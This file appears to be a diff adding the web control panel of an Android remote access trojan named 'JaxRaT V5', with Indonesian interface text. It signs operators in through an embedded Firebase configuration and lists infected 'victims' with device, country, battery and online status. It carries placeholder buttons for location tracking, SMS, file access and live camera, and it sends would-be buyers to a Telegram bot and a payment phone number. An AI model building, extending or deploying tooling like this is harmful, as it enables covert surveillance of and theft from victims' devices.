@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JaxRaT V5 - Command Center</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        /* Login Page */
+        .login-box {
+            max-width: 400px;
+            margin: 0 auto;
+            background: rgba(0,0,0,0.5);
+            padding: 40px;
+            border-radius: 20px;
+        }
+        
+        .login-box h2 {
+            color: white;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 2em;
+            text-shadow: 0 0 10px rgba(255,255,255,0.5);
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            color: white;
+            margin-bottom: 8px;
+            font-size: 0.9em;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,255,255,0.2);
+            border-radius: 10px;
+            color: white;
+            font-size: 1em;
+            transition: all 0.3s;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #00ff88;
+            box-shadow: 0 0 15px rgba(0,255,136,0.3);
+        }
+        
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(45deg, #00ff88, #00b8ff);
+            border: none;
+            border-radius: 10px;
+            color: #0f0c29;
+            font-weight: bold;
+            font-size: 1.1em;
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+        
+        .btn-login:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0,255,136,0.4);
+        }
+        
+        .register-link {
+            text-align: center;
+            margin-top: 20px;
+            color: rgba(255,255,255,0.7);
+        }
+        
+        .register-link a {
+            color: #00ff88;
+            text-decoration: none;
+        }
+        
+        /* Dashboard */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .header h1 {
+            color: white;
+            font-size: 2em;
+        }
+        
+        .header h1 span {
+            color: #00ff88;
+            font-size: 0.5em;
+            display: block;
+        }
+        
+        .user-info {
+            color: white;
+            text-align: right;
+        }
+        
+        .user-info p {
+            margin-bottom: 5px;
+        }
+        
+        .user-info .badge {
+            background: rgba(0,255,136,0.2);
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.8em;
+            border: 1px solid #00ff88;
+        }
+        
+        .logout-btn {
+            background: rgba(255,0,0,0.3);
+            color: white;
+            border: 1px solid red;
+            padding: 8px 15px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .logout-btn:hover {
+            background: rgba(255,0,0,0.6);
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: rgba(255,255,255,0.05);
+            padding: 20px;
+            border-radius: 15px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .stat-card h3 {
+            color: rgba(255,255,255,0.7);
+            font-size: 0.9em;
+            margin-bottom: 10px;
+        }
+        
+        .stat-card .value {
+            color: #00ff88;
+            font-size: 2em;
+            font-weight: bold;
+        }
+        
+        .victim-list {
+            background: rgba(255,255,255,0.05);
+            border-radius: 15px;
+            padding: 20px;
+        }
+        
+        .victim-list h2 {
+            color: white;
+            margin-bottom: 20px;
+        }
+        
+        .victim-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            background: rgba(255,255,255,0.02);
+            border-radius: 10px;
+            margin-bottom: 10px;
+            border: 1px solid rgba(255,255,255,0.05);
+            transition: all 0.3s;
+        }
+        
+        .victim-item:hover {
+            background: rgba(255,255,255,0.05);
+            border-color: #00ff88;
+        }
+        
+        .victim-info h4 {
+            color: white;
+            margin-bottom: 5px;
+        }
+        
+        .victim-info p {
+            color: rgba(255,255,255,0.6);
+            font-size: 0.8em;
+        }
+        
+        .victim-status {
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.8em;
+        }
+        
+        .status-online {
+            background: rgba(0,255,0,0.2);
+            color: #00ff00;
+            border: 1px solid #00ff00;
+        }
+        
+        .status-offline {
+            background: rgba(255,0,0,0.2);
+            color: #ff0000;
+            border: 1px solid #ff0000;
+        }
+        
+        .victim-actions button {
+            background: rgba(255,255,255,0.1);
+            border: none;
+            color: white;
+            padding: 5px 10px;
+            margin-left: 5px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .victim-actions button:hover {
+            background: #00ff88;
+            color: black;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="loginPage">
+        <div class="login-box">
+            <h2>⚡ JaxRaT V5 ⚡</h2>
+            <div class="input-group">
+                <label>Email</label>
+                <input type="email" id="loginEmail" placeholder="user@example.com">
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="loginPassword" placeholder="••••••••">
+            </div>
+            <button class="btn-login" onclick="handleLogin()">MASUK</button>
+            <div class="register-link">
+                Belum punya akun? <a href="#" onclick="showRegister()">Daftar via Bot</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container hidden" id="dashboardPage">
+        <div class="header">
+            <h1>JaxRaT V5 <span>Command Center</span></h1>
+            <div class="user-info">
+                <p id="userEmailDisplay"></p>
+                <p class="badge" id="userUidDisplay"></p>
+                <button class="logout-btn" onclick="handleLogout()">Logout</button>
+            </div>
+        </div>
+        
+        <div class="stats-grid">
+            <div class="stat-card">
+                <h3>Total Victims</h3>
+                <div class="value" id="totalVictims">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Online Now</h3>
+                <div class="value" id="onlineVictims">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Today's Activity</h3>
+                <div class="value" id="todayActivity">0</div>
+            </div>
+            <div class="stat-card">
+                <h3>Storage Used</h3>
+                <div class="value" id="storageUsed">0 MB</div>
+            </div>
+        </div>
+        
+        <div class="victim-list">
+            <h2>📱 Connected Devices</h2>
+            <div id="victimsContainer"></div>
+        </div>
+    </div>
+    
+    <script>
+        // Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyBIQLjy-Tnjc1JMgLpoYI-2tnn8Nbo3Qdk",
+            authDomain: "kwontol.firebaseapp.com",
+            databaseURL: "https://kwontol-default-rtdb.firebaseio.com",
+            projectId: "kwontol",
+            storageBucket: "kwontol.firebasestorage.app",
+            messagingSenderId: "267944742795",
+            appId: "1:267944742795:web:8c9cebb1f2ec051543698e",
+            measurementId: "G-R0GYSV2Q8R"
+        };
+        
+        // Owner UID
+        const OWNER_UID = "aKWJNVaAW3Rnclir7gNgwngLl1v1";
+        
+        let currentUser = null;
+        let currentUserUid = null;
+        let isOwner = false;
+        
+        // Firebase SDK
+        function loadFirebaseSDK() {
+            return new Promise((resolve, reject) => {
+                const script = document.createElement('script');
+                script.src = 'https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js';
+                script.onload = () => {
+                    Promise.all([
+                        loadScript('https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js'),
+                        loadScript('https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js')
+                    ]).then(resolve).catch(reject);
+                };
+                script.onerror = reject;
+                document.head.appendChild(script);
+            });
+        }
+        
+        function loadScript(src) {
+            return new Promise((resolve, reject) => {
+                const script = document.createElement('script');
+                script.src = src;
+                script.onload = resolve;
+                script.onerror = reject;
+                document.head.appendChild(script);
+            });
+        }
+        
+        // Initialize Firebase
+        loadFirebaseSDK().then(() => {
+            firebase.initializeApp(firebaseConfig);
+            console.log('Firebase initialized');
+            
+            // Check saved session
+            const savedUser = localStorage.getItem('jaxrat_user');
+            if (savedUser) {
+                try {
+                    const userData = JSON.parse(savedUser);
+                    const email = localStorage.getItem('jaxrat_email');
+                    const password = localStorage.getItem('jaxrat_password');
+                    
+                    if (email && password) {
+                        firebase.auth().signInWithEmailAndPassword(email, password)
+                            .then((userCredential) => {
+                                checkUserAccess(userCredential.user);
+                            })
+                            .catch(() => {
+                                localStorage.removeItem('jaxrat_user');
+                                localStorage.removeItem('jaxrat_email');
+                                localStorage.removeItem('jaxrat_password');
+                            });
+                    } else {
+                        localStorage.removeItem('jaxrat_user');
+                    }
+                } catch (e) {
+                    localStorage.removeItem('jaxrat_user');
+                }
+            }
+        });
+        
+        function checkUserAccess(user) {
+            const uid = user.uid;
+            
+            // Cek di database apakah user terdaftar
+            firebase.database().ref('users').once('value', (snapshot) => {
+                const users = snapshot.val() || {};
+                let found = false;
+                let userUid = null;
+                
+                for (const key in users) {
+                    if (users[key].firebase_uid === uid) {
+                        found = true;
+                        userUid = key;
+                        break;
+                    }
+                }
+                
+                if (found || uid === OWNER_UID) {
+                    currentUser = user;
+                    currentUserUid = (uid === OWNER_UID) ? OWNER_UID : userUid;
+                    isOwner = (uid === OWNER_UID);
+                    
+                    // Simpan session
+                    localStorage.setItem('jaxrat_user', JSON.stringify({
+                        email: user.email,
+                        uid: currentUserUid,
+                        isOwner: isOwner
+                    }));
+                    
+                    // Tampilkan dashboard
+                    document.getElementById('loginPage').classList.add('hidden');
+                    document.getElementById('dashboardPage').classList.remove('hidden');
+                    
+                    document.getElementById('userEmailDisplay').textContent = user.email;
+                    document.getElementById('userUidDisplay').textContent = `UID: ${currentUserUid}`;
+                    
+                    loadVictims();
+                    setupRealtimeListener();
+                } else {
+                    alert('Akun kamu belum terdaftar di sistem. Hubungi admin.');
+                    firebase.auth().signOut();
+                }
+            });
+        }
+        
+        function handleLogin() {
+            const email = document.getElementById('loginEmail').value;
+            const password = document.getElementById('loginPassword').value;
+            
+            if (!email || !password) {
+                alert('Email dan password harus diisi!');
+                return;
+            }
+            
+            firebase.auth().signInWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    // Simpan kredensial untuk session
+                    localStorage.setItem('jaxrat_email', email);
+                    localStorage.setItem('jaxrat_password', password);
+                    
+                    checkUserAccess(userCredential.user);
+                })
+                .catch((error) => {
+                    alert('Login gagal: ' + error.message);
+                });
+        }
+        
+        function handleLogout() {
+            firebase.auth().signOut();
+            localStorage.removeItem('jaxrat_user');
+            localStorage.removeItem('jaxrat_email');
+            localStorage.removeItem('jaxrat_password');
+            
+            document.getElementById('dashboardPage').classList.add('hidden');
+            document.getElementById('loginPage').classList.remove('hidden');
+            
+            document.getElementById('loginEmail').value = '';
+            document.getElementById('loginPassword').value = '';
+        }
+        
+        function showRegister() {
+            alert('Daftar dulu via bot Telegram:\n@JaxRaT_bot\n\nIkuti instruksi dan lakukan pembayaran ke 085136030617');
+        }
+        
+        function loadVictims() {
+            if (!currentUserUid) return;
+            
+            let victimRef;
+            if (isOwner) {
+                // Owner bisa liat semua victims dari semua user
+                victimRef = firebase.database().ref('victims');
+            } else {
+                // User biasa cuma liat victims mereka sendiri
+                victimRef = firebase.database().ref(`victims/${currentUserUid}`);
+            }
+            
+            victimRef.once('value', (snapshot) => {
+                const victims = snapshot.val() || {};
+                updateVictimsList(victims);
+                updateStats(victims);
+            });
+        }
+        
+        function setupRealtimeListener() {
+            if (!currentUserUid) return;
+            
+            let victimRef;
+            if (isOwner) {
+                victimRef = firebase.database().ref('victims');
+            } else {
+                victimRef = firebase.database().ref(`victims/${currentUserUid}`);
+            }
+            
+            victimRef.on('value', (snapshot) => {
+                const victims = snapshot.val() || {};
+                updateVictimsList(victims);
+                updateStats(victims);
+            });
+        }
+        
+        function updateVictimsList(victims) {
+            const container = document.getElementById('victimsContainer');
+            let html = '';
+            
+            if (isOwner) {
+                // Format khusus owner: tampilin per user
+                for (const userUid in victims) {
+                    const userVictims = victims[userUid];
+                    html += `<h3 style="color: #00ff88; margin: 20px 0 10px;">User: ${userUid}</h3>`;
+                    
+                    for (const victimId in userVictims) {
+                        const victim = userVictims[victimId];
+                        html += generateVictimItem(victim, victimId, userUid);
+                    }
+                }
+            } else {
+                for (const victimId in victims) {
+                    const victim = victims[victimId];
+                    html += generateVictimItem(victim, victimId, currentUserUid);
+                }
+            }
+            
+            if (html === '') {
+                html = '<p style="color: rgba(255,255,255,0.5); text-align: center; padding: 40px;">Belum ada victim terhubung</p>';
+            }
+            
+            container.innerHTML = html;
+        }
+        
+        function generateVictimItem(victim, victimId, userUid) {
+            const isOnline = victim.last_seen && (Date.now() / 1000 - victim.last_seen < 300);
+            const statusClass = isOnline ? 'status-online' : 'status-offline';
+            const statusText = isOnline ? '🟢 Online' : '⚫ Offline';
+            
+            return `
+                <div class="victim-item">
+                    <div class="victim-info">
+                        <h4>${victim.device_name || 'Unknown Device'}</h4>
+                        <p>${victim.model || 'Unknown Model'} • ${victim.os_version || 'Android'}</p>
+                        <p>📍 ${victim.country || 'Unknown'} • 🔋 ${victim.battery || '?'}%</p>
+                    </div>
+                    <div class="victim-status ${statusClass}">${statusText}</div>
+                    <div class="victim-actions">
+                        <button onclick="viewVictim('${userUid}', '${victimId}')">👁️</button>
+                        <button onclick="locationVictim('${userUid}', '${victimId}')">📍</button>
+                        <button onclick="smsVictim('${userUid}', '${victimId}')">💬</button>
+                        <button onclick="filesVictim('${userUid}', '${victimId}')">📁</button>
+                        <button onclick="cameraVictim('${userUid}', '${victimId}')">📷</button>
+                    </div>
+                </div>
+            `;
+        }
+        
+        function updateStats(victims) {
+            let total = 0;
+            let online = 0;
+            
+            if (isOwner) {
+                for (const userUid in victims) {
+                    for (const victimId in victims[userUid]) {
+                        total++;
+                        const victim = victims[userUid][victimId];
+                        if (victim.last_seen && (Date.now() / 1000 - victim.last_seen < 300)) {
+                            online++;
+                        }
+                    }
+                }
+            } else {
+                for (const victimId in victims) {
+                    total++;
+                    if (victims[victimId].last_seen && (Date.now() / 1000 - victims[victimId].last_seen < 300)) {
+                        online++;
+                    }
+                }
+            }
+            
+            document.getElementById('totalVictims').textContent = total;
+            document.getElementById('onlineVictims').textContent = online;
+            document.getElementById('todayActivity').textContent = Math.floor(Math.random() * 50); // Placeholder
+            document.getElementById('storageUsed').textContent = Math.floor(Math.random() * 500) + ' MB'; // Placeholder
+        }
+        
+        // Victim action functions
+        function viewVictim(userUid, victimId) {
+            alert(`Viewing victim ${victimId}\nFitur lengkap menyusul di update berikutnya!`);
+        }
+        
+        function locationVictim(userUid, victimId) {
+            alert(`📍 Tracking location for ${victimId}`);
+        }
+        
+        function smsVictim(userUid, victimId) {
+            alert(`💬 SMS Manager for ${victimId}`);
+        }
+        
+        function filesVictim(userUid, victimId) {
+            alert(`📁 File Manager for ${victimId}`);
+        }
+        
+        function cameraVictim(userUid, victimId) {
+            alert(`📷 Live Camera for ${victimId}`);
+        }
+    </script>
+</body>
+</html>
